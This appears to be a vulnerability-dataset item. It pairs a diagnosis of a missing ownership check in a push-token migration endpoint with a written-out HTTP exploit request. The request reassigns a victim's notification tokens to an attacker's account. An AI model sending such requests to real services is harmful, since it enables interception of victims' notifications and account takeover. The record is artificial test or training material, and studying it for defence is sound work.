diagnosis: The device migration endpoint reassigns all push notification tokens from sourceUserId to targetUserId based solely on parameters in the request body. It fails to verify that the authenticated caller owns sourceUserId or has administrative migration privileges, allowing an attacker to steal push tokens and intercept notifications.
exploit_request:
POST /api/devices/migrate-tokens HTTP/1.1
Host: api.mobileauth.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"sourceUserId": "usr_victim_finance_889", "targetUserId": "usr_attacker_phone_22"}
